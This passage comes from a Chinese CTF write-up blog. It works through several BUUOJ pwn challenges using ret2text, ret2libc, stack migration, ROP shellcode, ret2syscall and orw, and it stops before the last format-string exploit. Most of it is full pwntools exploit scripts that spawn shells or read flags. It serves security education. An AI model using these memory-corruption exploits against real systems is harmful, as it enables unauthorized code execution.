<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_2&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_2&#x27;</span>) </span><br><span class="line">offset = <span class="number">0x6c</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">addr = p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr = u32(addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/Qi8D6KcjJaPpbyq.png"></p>
<blockquote>
<p>直接把overflow1的exp改一下就能过了…</p>
</blockquote>
<h2 id="0x033-wustctf2020-getshell-ret2text"><a href="#0x033-wustctf2020-getshell-ret2text" class="headerlink" title="0x033.wustctf2020_getshell - ret2text"></a>0x033.wustctf2020_getshell - ret2text</h2><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2021/02/01/tIesqmfnBPlAgx1.png"></p>
<p>拖入IDA进行分析,存在溢出</p>
<p><img src="https://i.loli.net/2021/02/01/e9RrFPN8jJT4g5M.png"></p>
<p>同时存在后门函数</p>
<p><img src="https://i.loli.net/2021/02/01/Dkl7FtfjYPodu5Q.png"></p>
<p>故考虑ret2text执行后门函数即可</p>
<p>构造exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804851b</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./wustctf2020_getshell&#x27;</span>)<span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,27471)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可getshell</p>
<p><img src="https://i.loli.net/2021/02/01/nupX24A7yejRqlw.png"></p>
<h2 id="0x034-bbys-tu-2016-ret2text"><a href="#0x034-bbys-tu-2016-ret2text" class="headerlink" title="0x034.bbys_tu_2016 - ret2text"></a>0x034.bbys_tu_2016 - ret2text</h2><p>惯例的<code>chekcsec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2021/02/01/LrDqPzmtZW6NV7A.png"></p>
<p>拖入IDA进行分析，直接就有一个溢出</p>
<p><img src="https://i.loli.net/2021/02/01/cTNupzvWYnZ937A.png"></p>
<p>有一个能直接读flag的函数，溢出到这即可</p>
<p><img src="https://i.loli.net/2021/02/01/hsdVW2SMNkBUbqi.png"></p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bbys_tu_2016&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25054)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bbys_tu_2016&#x27;</span>) </span><br><span class="line">offset = <span class="number">0x14</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;printFlag&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get flag</p>
<p><img src="https://i.loli.net/2021/02/01/Q5F8mfisazVTqyo.png"></p>
<h2 id="0x035-xdctf2015-pwn200-ret2libc"><a href="#0x035-xdctf2015-pwn200-ret2libc" class="headerlink" title="0x035.xdctf2015_pwn200 - ret2libc"></a>0x035.xdctf2015_pwn200 - ret2libc</h2><p>惯例的<code>chekcsec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2021/02/01/aZAjEc6w5CS3bUz.png"></p>
<p>拖入IDA进行分析，直接就有一个溢出</p>
<p><img src="https://i.loli.net/2021/02/01/QlLoVfjt9qM4XrY.png"></p>
<p>由于没有能直接get shell的函数，故考虑ret2libc</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25987)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bof&#x27;</span>) </span><br><span class="line">offset = <span class="number">0x6c</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv() </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/Ba1Pq6KiZew9yxV.png"></p>
<blockquote>
<p>学长们出的题，没想到短短5年时间CTF-pwn的主流就从简单的栈溢出到了现在的各种复杂的堆利用手法…现在的大比赛哪怕是签到题都至少是tcache double free起手…</p>
<p><del>不过15年说不定都没有pwntools和LibcSearcher这样方便的python库</del></p>
<p>以及这道题和前面的0x37几乎一模一样（x</p>
</blockquote>
<h2 id="0x036-gyctf-2020-borrowstack-ret2csu-ret2libc-stack-migration"><a href="#0x036-gyctf-2020-borrowstack-ret2csu-ret2libc-stack-migration" class="headerlink" title="0x036.gyctf_2020_borrowstack - ret2csu + ret2libc + stack migration"></a>0x036.gyctf_2020_borrowstack - ret2csu + ret2libc + stack migration</h2><p>惯例<code>checksec</code>，只开了栈不可执行保护</p>
<p><img src="https://i.loli.net/2021/02/01/zW2I7G4xtuiNkHa.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/02/01/PLdljpqYJRs24GC.png"></p>
<p>第一次读到栈上溢出0x10字节，第二次读到bss段上，暗示我们进行栈迁移</p>
<p>由于没有后门函数，故考虑ret2libc，使用栈迁移在bss段构造rop链执行one_gadget（题目已给出libc版本， 以及不明原因<code>system(&quot;/bin/sh&quot;)</code>无法执行）</p>
<p>需要注意的是bss段离got表比较近，需要先抬高栈</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,25454)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400703</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">back_to_read = <span class="number">0x400680</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">offset = <span class="number">0x60</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(bss_addr) + p64(leave_ret)</span><br><span class="line">payload2 = p64(ret) * <span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload2)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(bss_addr) + p64(libc_base + one_gadget)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/DFX1v28W9YEmSKg.png"></p>
<h2 id="0x037-inndy-rop-ret2shellcode-ret2text-ret2syscall-orw"><a href="#0x037-inndy-rop-ret2shellcode-ret2text-ret2syscall-orw" class="headerlink" title="0x037.inndy_rop - ret2shellcode | ret2text | ret2syscall | orw"></a>0x037.inndy_rop - ret2shellcode | ret2text | ret2syscall | orw</h2><p>惯例的<code>chekcsec</code>，发现只开了NX保护</p>
<p><img src="https://i.loli.net/2021/02/01/sDUmdGvefPJ6Int.png"></p>
<p>拖入IDA进行分析，直接就有一个溢出</p>
<p><img src="https://i.loli.net/2021/02/01/pEYSdzKGOtARiPQ.png"></p>
<h3 id="解法一：ret2shellcode"><a href="#解法一：ret2shellcode" class="headerlink" title="解法一：ret2shellcode"></a>解法一：ret2shellcode</h3><p>由于静态编译封装了mprotect，考虑修改bss段执行权限后在bss段构造shellcode后返回至bss即可get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;mprotect&#x27;</span>]) + p32(pop_esi_pop_ebx_pop_edx_ret) + p32(e.bss() &amp; <span class="number">0xffff000</span>) + p32(<span class="number">0x2000</span>) + p32(<span class="number">7</span>) + p32(e.sym[<span class="string">&#x27;gets&#x27;</span>]) + p32(e.bss()) + p32(e.bss())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/c87TDlSWLM65mfX.png"></p>
<h3 id="解法二：ret2text-with-ROPgadget"><a href="#解法二：ret2text-with-ROPgadget" class="headerlink" title="解法二：ret2text with ROPgadget"></a>解法二：ret2text with ROPgadget</h3><p>同样的，这一题也可以使用<code>ROPgadget</code>所提供的payload以get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26508</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>():</span><br><span class="line">	<span class="comment"># Padding goes here</span></span><br><span class="line">	p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">	p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">	p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line">	</span><br><span class="line">p.sendline(offset * <span class="string">b&#x27;A&#x27;</span> + p32(<span class="number">0xdeadbeef</span>) + payload())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/L3TcHlspvK6GkYy.png"></p>
<h3 id="解法三：ret2syscall"><a href="#解法三：ret2syscall" class="headerlink" title="解法三：ret2syscall"></a>解法三：ret2syscall</h3><p>由于存在大量的syscall gadget，故也可以考虑ret2syscall以get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x80de769</span></span><br><span class="line">pop_edx_ret = <span class="number">0x806ecda</span></span><br><span class="line">pop_ebx_pop_edx_ret = <span class="number">0x806ecd9</span></span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line">pop_eax_ret = <span class="number">0x80b8016</span></span><br><span class="line">syscall = <span class="number">0x80627cd</span></span><br><span class="line">int_0x80 = <span class="number">0x806c943</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;gets&#x27;</span>]) + p32(pop_edx_ret) + p32(e.bss()) + p32(pop_eax_ret) + p32(<span class="number">11</span>) + p32(pop_ebx_pop_edx_ret) + p32(e.bss()) + p32(<span class="number">0</span>) + p32(pop_ecx_ret) + p32(<span class="number">0</span>) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/LwU4ZphsTv17RMj.png"></p>
<blockquote>
<p>在这里用syscall似乎没法get shell，得用int 0x80，原因不明…</p>
</blockquote>
<h3 id="解法四：orw"><a href="#解法四：orw" class="headerlink" title="解法四：orw"></a>解法四：orw</h3><p>由于没有能直接get shell的函数，故也可以考虑orw读取flag</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line">pop_edx_ret = <span class="number">0x806ecda</span></span><br><span class="line">pop_ebx_pop_edx_ret = <span class="number">0x806ecd9</span></span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;gets&#x27;</span>]) + p32(pop_edx_ret) + p32(e.bss()) + p32(e.sym[<span class="string">&#x27;open&#x27;</span>]) + p32(pop_ebx_pop_edx_ret) + p32(e.bss()) + p32(<span class="number">4</span>) + p32(e.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_esi_pop_ebx_pop_edx_ret) + p32(<span class="number">3</span>) + p32(e.bss()) + p32(<span class="number">0x100</span>) + p32(e.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">1</span>) + p32(e.bss()) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/02/01/QscBe1PkAmZXHV9.png"></p>
<h2 id="0x038-axb-2019-fmt32-fmtstr-got-hijack-BROP"><a href="#0x038-axb-2019-fmt32-fmtstr-got-hijack-BROP" class="headerlink" title="0x038.axb_2019_fmt32 - fmtstr + got hijack | BROP"></a>0x038.axb_2019_fmt32 - fmtstr + got hijack | BROP</h2><p>惯例的 <code>checksec</code> ，只开了 NX</p>
<p><img src="https://i.loli.net/2021/04/03/4rI3JKsdcEuhaZe.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>有一个比较明显的格式化字符串漏洞</p>
<p><img src="https://i.loli.net/2021/04/03/qoTEDaSQskOKGLu.png" alt="image.png"></p>
<p>简单测一下，没有对齐…不过问题不大</p>
<p><img src="https://i.loli.net/2021/04/03/XaIkv6RJY8oMnUe.png" alt="image.png"></p>
<h3 id="解法一：fmtstr-got-hijack"><a href="#解法一：fmtstr-got-hijack" class="headerlink" title="解法一：fmtstr + got hijack"></a>解法一：fmtstr + got hijack</h3><p>可以利用格式化字符串漏洞泄露 libc 地址，原本想在栈上构造rop，后面想想一个是太麻烦了，另一个是程序使用了 <code>strlen(format)</code>，可以直接劫持 got 表里的 strlen 为 <code>system</code> 以后输 <code>/bin/sh</code>即可get shell</p>
<p>需要注意的是题目中字符串开头会固定有一个 9 字节长的 <code>&quot;Repeater:&quot;</code>，在手动计算构造格式化字符串时应当加上其长度，同时我们应当输入 <code>;</code> 以在命令中隔开这个字符串</p>
<p>笔者个人更喜欢将需要写入的地址放在前面，方便计算长度</p>
<p>exp 如下：</p>
